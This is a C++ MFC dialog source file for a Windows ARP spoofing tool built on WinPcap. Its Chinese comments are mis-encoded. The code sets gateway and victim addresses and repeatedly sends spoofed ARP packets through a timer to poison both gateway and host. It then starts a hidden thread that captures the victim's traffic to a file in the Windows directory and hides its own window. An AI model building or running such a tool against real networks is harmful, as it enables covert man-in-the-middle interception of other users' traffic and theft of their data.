// ArpSpoofDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "ArpSpoof.h"
#include "ArpSpoofDlg.h"
#include "ArpSpoofLib.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
END_MESSAGE_MAP()


// CArpSpoofDlg �Ի���




CArpSpoofDlg::CArpSpoofDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CArpSpoofDlg::IDD, pParent)
	, szLocalMac(_T(""))
	, szHostMac(_T(""))
	, szGatewayIp(_T("192.168.1.1"))
	, szHostIp(_T("192.168.1.253"))
	, szGatewayMac(_T("74ea3a28971c"))
	, m_szLocalIp(_T(""))
	, m_bchkGateway(1)
	, m_bchkHost(1)
	, m_szFileName(_T("c:\\windows\\wincap.cap"))
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CArpSpoofDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_LOCAL_MAC, szLocalMac);
	DDX_Text(pDX, IDC_EDIT_HOST_MAC, szHostMac);
	DDX_Text(pDX, IDC_EDIT_GATEWAY_IP, szGatewayIp);
	DDX_Text(pDX, IDC_EDIT_HOST_IP, szHostIp);
	DDX_Text(pDX, IDC_EDIT_GATEWAY_MAC, szGatewayMac);
	DDX_Control(pDX, IDC_CMB_INTERFACE_LIST, m_cmbInterfaceList);
	DDX_Text(pDX, IDC_EDIT_LOCAL_IP, m_szLocalIp);
	DDX_Check(pDX, IDC_CHECK_GATEWAY, m_bchkGateway);
	DDX_Check(pDX, IDC_CHECK_HOST, m_bchkHost);
	DDX_Text(pDX, IDC_EDIT1, m_szFileName);
}

BEGIN_MESSAGE_MAP(CArpSpoofDlg, CDialog)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDOK, &CArpSpoofDlg::OnBnClickedOk)
	ON_BN_CLICKED(IDCANCEL, &CArpSpoofDlg::OnBnClickedCancel)
	ON_WM_TIMER()
	ON_BN_CLICKED(IDC_BUTTON_HOST, &CArpSpoofDlg::OnBnClickedButtonHost)
	ON_BN_CLICKED(IDC_BUTTON_GATEWAY, &CArpSpoofDlg::OnBnClickedButtonGateway)
	ON_CBN_SELCHANGE(IDC_CMB_INTERFACE_LIST, &CArpSpoofDlg::OnCbnSelchangeCmbInterfaceList)
	ON_BN_CLICKED(IDC_BUTTON1, &CArpSpoofDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CArpSpoofDlg::OnBnClickedButton2)
END_MESSAGE_MAP()


// CArpSpoofDlg ��Ϣ�������

BOOL CArpSpoofDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	m_cmbInterfaceList.SetDroppedWidth(300);
	//��ʼ���ӿ��б�
	InitInterfaceList();
	OnCbnSelchangeCmbInterfaceList();
	OnBnClickedButtonHost();

	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CArpSpoofDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CArpSpoofDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CArpSpoofDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

int SetValue_D(struct HKEY__ * ReRootKey, TCHAR * ReSubKey, TCHAR * ReValueName, DWORD data)
{
	int i = 0;	//���������0==succeed
	HKEY hKey = NULL;
	if(RegOpenKeyEx(ReRootKey, ReSubKey, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
	{
		if(RegSetValueEx(hKey, ReValueName, NULL, REG_DWORD,(const BYTE*) &data, 4) != ERROR_SUCCESS)
		{
			AfxMessageBox("�����޷������йص�ע�����Ϣ");
			i=1;
		}
		RegCloseKey(hKey);
	}
	else
	{
		AfxMessageBox("�����޷���ѯ�йص�ע�����Ϣ");
		i=1;
	}
	return i;
}

void CArpSpoofDlg::OnBnClickedOk()
{
	LONG lRet = 0;
	HKEY hkey;
	DWORD value = 1;
	//д��ע����Ҫ��������������Ч������·��ת��
	/*lRet = SetValue_D(HKEY_LOCAL_MACHINE,
		"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameter\\", "IPEnableRouter",
		value);*/

	KillTimer(0);
	SetTimer(0, 3000, NULL);
    this->GetDlgItem(IDOK)->EnableWindow(FALSE);
	//OnOK();
}

void CArpSpoofDlg::OnBnClickedCancel()
{
	KillTimer(0);
	this->GetDlgItem(IDOK)->EnableWindow(TRUE);
	//OnCancel();
}

int CArpSpoofDlg::InitInterfaceList()
{
	int nRet = 0;
	nRet = ListInterfaceInfomation(ListInterface, this);
	return nRet;
}

int CArpSpoofDlg::ListInterface(pcap_if_t * d, void * pPara)
{
	USES_CONVERSION;
	CArpSpoofDlg * pThis = (CArpSpoofDlg * )pPara;

	COMBOBOXEXITEM   Item;
	Item.mask = CBEIF_TEXT;
	Item.pszText = d->name;
	Item.iItem = pThis->m_cmbInterfaceList.GetCount(); //index 
	pThis->m_cmbInterfaceList.InsertItem(&Item);
	pThis->m_cmbInterfaceList.SetCurSel(0);
	TRACE(_T("name:%s\n"), d->name);
	TRACE(_T("description:%s\n"), d->description);

	return 0;
}

void CArpSpoofDlg::OnTimer(UINT_PTR nIDEvent)
{
	USES_CONVERSION;
	int nIndex = 0;

	COMBOBOXEXITEM Item;
	UpdateData();
	//TRACE("gateway mac:%s\n", szGatewayMac);
	CString szInterfaceName;
	memset(&Item, 0, sizeof(COMBOBOXEXITEM));
	Item.mask = CBEIF_TEXT;
	nIndex = m_cmbInterfaceList.GetCurSel();

	m_cmbInterfaceList.GetLBText(nIndex, szInterfaceName);

	//TRACE(_T("interface name:%s\n"), szInterfaceName);

	ArpSpoof(T2A((LPTSTR)(LPCTSTR)szInterfaceName), T2A((LPTSTR)(LPCTSTR)szGatewayIp),
		T2A((LPTSTR)(LPCTSTR)szGatewayMac), T2A((LPTSTR)(LPCTSTR)szHostIp),
		T2A((LPTSTR)(LPCTSTR)szHostMac), T2A((LPTSTR)(LPCTSTR)szLocalMac),
		m_bchkGateway, m_bchkHost);

	//CDialog::OnTimer(nIDEvent);
}

int CArpSpoofDlg::SendArpRequest(CString szIp)
{
	USES_CONVERSION;
	int nIndex = 0;
	int nRet = 0;
	struct arp_packet packet;
	pcap_t * pHandler;
	char errbuf[PCAP_ERRBUF_SIZE];    //���󻺳��� 
	COMBOBOXEXITEM Item;
	
	CString szInterfaceName;
	memset(&Item, 0, sizeof(COMBOBOXEXITEM));
	Item.mask = CBEIF_TEXT;
	nIndex = m_cmbInterfaceList.GetCurSel();

	m_cmbInterfaceList.GetLBText(nIndex, szInterfaceName);

	nRet = BuildArpRequest(&packet, T2A((LPTSTR)(LPCTSTR)szLocalMac), "FFFFFFFFFFFF",
		T2A((LPTSTR)(LPCTSTR)m_szLocalIp), T2A((LPTSTR)(LPCTSTR)szHostIp));
	/* ������ */ 
	if((pHandler = pcap_open((char*)(LPCTSTR)szInterfaceName, // name of the device 
		65536, // portion of the packet to capture 
		0, //open flag 
		1000, // read timeout 
		NULL, // authentication on the remote machine 
		errbuf // error buffer 
		) ) == NULL) 
	{ 
		TRACE("\nUnable to open the adapter. %s is not supported by WinPcap\n",
			szInterfaceName); 
		/* Free the device list */ 
		return -1; 
	} 

	if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
	{
		TRACE("pcap_sendpacket send arp spoof to gateway error.\n");
	}

	pcap_close(pHandler); 
}

void CArpSpoofDlg::OnBnClickedButtonHost()
{
	USES_CONVERSION;
	int nRet = 0;
	unsigned char hostMac[6];
	ULONG len = MAC_LENGTH;
	UpdateData();

	nRet = SendARP(inet_addr(szHostIp), inet_addr(m_szLocalIp), hostMac, &len);
	if(NO_ERROR != nRet)
	{
		TRACE("SendARP error.nRet:%d\n", nRet);
		return;
	} // ���� if(NO_ERROR != nRet)

	szHostMac = GetMacString(hostMac);
	UpdateData(FALSE);
}

void CArpSpoofDlg::OnBnClickedButtonGateway()
{
	USES_CONVERSION;
	int nRet = 0;
	unsigned char Mac[6];
	ULONG len = MAC_LENGTH;
	UpdateData();

	nRet = SendARP(inet_addr(szGatewayIp), inet_addr(m_szLocalIp), Mac, &len);
	if(NO_ERROR != nRet)
	{
		TRACE("SendARP error.nRet:%d", nRet);
		return;
	}// ���� if(NO_ERROR != nRet)

	//UpdateData();
	//SendArpRequest(szGatewayIp);
	//Sleep(200);
	//nRet = GetMac(T2A((LPTSTR)(LPCTSTR)szGatewayIp), Mac);
	//if(nRet)
	//{
	//	return;
	//}// ���� if(nRet)

	szGatewayMac = GetMacString(Mac);
	UpdateData(FALSE);
}

void CArpSpoofDlg::OnCbnSelchangeCmbInterfaceList()
{
	USES_CONVERSION;
	int nIndex = 0;
	unsigned char mac[6];
	COMBOBOXEXITEM Item;
	UpdateData();

	CString szInterfaceName;
	memset(&Item, 0, sizeof(COMBOBOXEXITEM));
	Item.mask = CBEIF_TEXT;
	nIndex = m_cmbInterfaceList.GetCurSel();

	m_cmbInterfaceList.GetLBText(nIndex, szInterfaceName);

	GetSelfMac((char*)(LPCTSTR)szInterfaceName, mac);
	szLocalMac = GetMacString(mac);
	UpdateData(FALSE);
}

DWORD WINAPI cap_main(LPVOID lpParameter);

//������һ���߳̽��в����ļ��������ضԻ���
void CArpSpoofDlg::OnBnClickedButton1()
{
	CString szInterfaceName;
	int nIndex = 0;
	COMBOBOXEXITEM Item;
	UpdateData();
	memset(&Item, 0, sizeof(COMBOBOXEXITEM));
	Item.mask = CBEIF_TEXT;
	nIndex = m_cmbInterfaceList.GetCurSel();

	m_cmbInterfaceList.GetLBText(nIndex, szInterfaceName);
	
	m_p.devName = szInterfaceName;
	m_p.filter = "ip host " + szHostIp;
	m_p.fileName = m_szFileName;
	CreateThread(NULL, NULL, cap_main, &m_p, NULL, NULL);

	OnBnClickedOk();
	this->ShowWindow(SW_HIDE);
}

void CArpSpoofDlg::OnBnClickedButton2()
{
	OnOK();
}
